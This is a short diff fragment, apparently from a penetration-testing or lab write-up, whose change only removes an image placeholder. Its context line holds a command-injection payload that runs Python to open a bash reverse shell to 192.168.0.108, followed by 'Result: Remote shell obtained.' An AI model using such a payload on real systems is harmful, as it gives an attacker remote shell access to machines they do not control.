@@ -115,7 +115,7 @@ $(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/192.168.0.108/4
 
 
 Result: Remote shell obtained.  
-[IMAGE PLACEHOLDER]
+
 
 ---
 
